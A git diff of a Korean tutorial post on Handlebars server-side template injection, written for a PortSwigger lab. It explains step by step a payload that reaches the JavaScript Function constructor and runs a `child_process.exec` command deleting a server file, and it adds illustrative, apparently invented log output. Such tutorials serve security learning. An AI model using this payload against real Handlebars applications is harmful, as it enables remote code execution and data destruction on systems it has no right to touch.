@@ -1,28 +1,28 @@
 ---
 title: Handlebars SSTI
-desc: What is Handlebars SSTI?
+desc: Handlebars SSTI란 무엇인가?
 date: 2024-12-04
-thumbnail: /posts/advanced_skill/mongodb_injection/thumbnail.png
+thumbnail: /posts/advanced_skill/handlebars_ssti/thumbnail.png
 ---
 
-## What's Handlebars SSTI?
-Handlebars SSTI는 서버 측 템플릿 엔진인 Handlebars에서 발생할 수 있는 보안 취약점입니다.
+## Handlebars SSTI란?
+Handlebars SSTI는 서버 측 템플릿 엔진인 Handlebars에서 발생할 수 있는 보안 취약점입니다. 이 취약점은 공격자가 서버에서 실행되는 코드를 주입할 수 있게 하여, 원하지 않는 명령어 실행이나 데이터 유출을 초래할 수 있습니다.
 
-이 취약점은 공격자가 서버에서 실행되는 코드를 주입할 수 있게 하여, 원하지 않는 명령어 실행이나 데이터 유출을 초래할 수 있습니다.
-
-> 💡4.0.14 이전 버전에서만 취약합니다. 
+> 💡 이 취약점은 4.0.14 이전 버전에서만 발생합니다.
 
 ---
-## Background
+
+## 배경
 
 ### SSTI
-ServerSide Template Injection의 약자로 Template 엔진에 악의적인 구문을 넣어 공격이 성공한다면 RCE, LFI 등을 실행할 수 있다.
+SSTI는 Server-Side Template Injection의 약자로, 템플릿 엔진에 악의적인 구문을 삽입하여 공격이 성공할 경우 RCE, LFI 등을 실행할 수 있습니다.
 
 ### Handlebars
-NodeJs 기반 프레임워크에서 사용되는 Template 엔진
+Handlebars는 Node.js 기반 프레임워크에서 사용되는 템플릿 엔진입니다.
 
 ---
-## Payload
+
+## 페이로드
 ```handlebars
 {{#with "s" as |string|}}
     {{#with "e"}}
@@ -46,7 +46,8 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
 ```
 
 ---
-## Payload Explain
+
+## 페이로드 설명
 
 ### 1. "s" 문자열을 변수화
 ```handlebars
@@ -54,7 +55,7 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
     ...
 {{/with}}
 ```
-```{{#with ... as |alias|}}```는 Handlebars.js에서 제공하는 블록 헬퍼로, "s"라는 문자열을 **string**이라는 이름으로 변수화합니다. 이 변수는 이후 조작 대상이 됩니다.
+`{{#with ... as |alias|}}`는 Handlebars.js에서 제공하는 블록 헬퍼로, "s"라는 문자열을 **string**이라는 이름으로 변수화합니다. 이 변수는 이후 조작 대상이 됩니다.
 
 ```log
 [INFO] "s" 문자열이 string 변수로 할당됨
@@ -67,8 +68,7 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
     ...
 {{/with}}
 ```
-```split```은 JavaScript에서 문자열을 특정 구분자를 기준으로 나누는 메서드입니다. 이 템플릿에서는 이를 통해 리스트(배열)처럼 보이는 객체를 생성합니다.
-생성된 리스트는 ```conslist```라는 이름으로 저장되며, 이후 객체 내부 메서드(push, pop)를 이용해 조작됩니다.
+`split`은 JavaScript에서 문자열을 특정 구분자를 기준으로 나누는 메서드입니다. 이 템플릿에서는 이를 통해 리스트(배열)처럼 보이는 객체를 생성합니다. 생성된 리스트는 `conslist`라는 이름으로 저장되며, 이후 객체 내부 메서드(push, pop)를 이용해 조작됩니다.
 
 ```log
 [INFO] split 객체가 conslist로 할당됨
@@ -79,8 +79,8 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
 ```handlebars
 {{this.pop}}
 ```
-```pop``` 메서드는 배열의 마지막 요소를 제거하고 반환합니다.
-리스트가 비어있으므로 아무것도 하지 않음
+`pop` 메서드는 배열의 마지막 요소를 제거하고 반환합니다. 리스트가 비어있으므로 아무것도 하지 않음
+
 ```log
 [INFO] conslist에서 pop 메서드 호출
 [DEBUG] conslist = []
@@ -90,10 +90,7 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
 ```handlebars
 {{this.push (lookup string.sub "constructor")}}
 ```
-```lookup```는 특정 객체의 속성이나 메서드에 접근하는 헬퍼입니다. 
-여기서```string.sub```는 string 객체에서 sub 메서드를 참조한 것입니다.
-```constructor```는 JavaScript의 모든 객체에 존재하는 기본 속성으로, 생성자 함수에 접근하는 데 사용됩니다.
-결과적으로 이 코드는 JavaScript의 Function constructor를 참조하여 임의 코드 실행이 가능하게 만듭니다.
+`lookup`는 특정 객체의 속성이나 메서드에 접근하는 헬퍼입니다. 여기서 `string.sub`는 string 객체에서 sub 메서드를 참조한 것입니다. `constructor`는 JavaScript의 모든 객체에 존재하는 기본 속성으로, 생성자 함수에 접근하는 데 사용됩니다. 결과적으로 이 코드는 JavaScript의 Function constructor를 참조하여 임의 코드 실행이 가능하게 만듭니다.
 
 ```log
 [INFO] string.sub 메서드의 constructor 속성 참조 시도
@@ -106,10 +103,13 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
 ```handlebars
 {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
 ```
-여기서 push를 통해 리스트에 시스템 명령어를 포함하는 문자열을 삽입합니다.
-명령어 내용:
-```require('child_process')```Node.js에서 시스템 명령어를 실행할 수 있는 모듈을 로드합니다.
-```.exec(...)```시스템 쉘 명령어를 실행하는 메서드로, 여기서는 서버에서 특정 파일(/home/carlos/morale.txt)을 삭제하는 명령어(rm)를 실행하려고 합니다.
+여기서 push를 통해 리스트에 시스템 명령어를 포함하는 문자열을 삽입합니다. 명령어 내용:
+`require('child_process')`는 Node.js에서 시스템 명령어를 실행할 수 있는 모듈을 로드합니다. `.exec(...)`는 시스템 쉘 명령어를 실행하는 메서드로, 여기서는 서버에서 특정 파일(/home/carlos/morale.txt)을 삭제하는 명령어(rm)를 실행하려고 합니다.
+
+```log
+[ACTION] string.split 호출로 codelist 생성.
+[STATE] codelist = ["return require('child_process').exec('rm /home/carlos/morale.txt');"]
+```
 
 ### 6. 템플릿 반복문 실행
 ```handlebars
@@ -119,22 +119,24 @@ NodeJs 기반 프레임워크에서 사용되는 Template 엔진
     {{/with}}
 {{/each}}
 ```
-#each는 Handlebars.js에서 제공하는 반복문으로, 리스트(conslist)의 모든 요소를 순회합니다.
-```string.sub.apply(0, codelist)```
-string.sub는 문자열 메서드를 참조한 것으로, .apply를 사용해 실행 시 인자를 리스트로 전달합니다.
-이를 통해 조작된 codelist를 실행 컨텍스트에 적용하여 JavaScript 코드를 실행하려 합니다.
-최종적으로 ```{{this}}```는 템플릿 내에서 현재 컨텍스트를 출력하거나 실행하는 데 사용됩니다.
+`#each`는 Handlebars.js에서 제공하는 반복문으로, 리스트(conslist)의 모든 요소를 순회합니다. `string.sub.apply(0, codelist)`는 `string.sub`가 문자열 메서드 Function을 참조한 것으로, `apply`를 사용해 실행 시 인자를 리스트로 전달합니다. 이를 통해 조작된 codelist를 실행 컨텍스트에 적용하여 JavaScript 코드를 실행하려 합니다. 최종적으로 `{{this}}`는 템플릿 내에서 현재 컨텍스트를 출력하거나 실행하는 데 사용됩니다.
 
-
+```log
+[INFO] conslist 순회 시작 (현재 conslist는 빈 배열).
+[ACTION] string.sub.apply 호출로 codelist 실행.
+[EXECUTE] "require('child_process').exec('rm /home/carlos/morale.txt');" 실행.
+```
 
 공격자는 템플릿 엔진이 제공하는 헬퍼와 메서드 체인 조작 기능을 이용해 JavaScript의 Function constructor에 접근하고, 이를 통해 코드를 실행합니다.
 
 ---
-## Reference
-https://book.hacktricks.xyz/kr/pentesting-web/ssti-server-side-template-injection
-https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html
-https://handlebarsjs.com/ko/guide/builtin-helpers.html#with
+
+## 참고 자료
+- [HackTricks - SSTI](https://book.hacktricks.xyz/kr/pentesting-web/ssti-server-side-template-injection)
+- [Mahmoud Security Blog](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+- [Handlebars.js 공식 문서](https://handlebarsjs.com/ko/guide/builtin-helpers.html#with)
 
 ---
-## Lab
-https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
+
+## 실습
+- [PortSwigger Lab](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
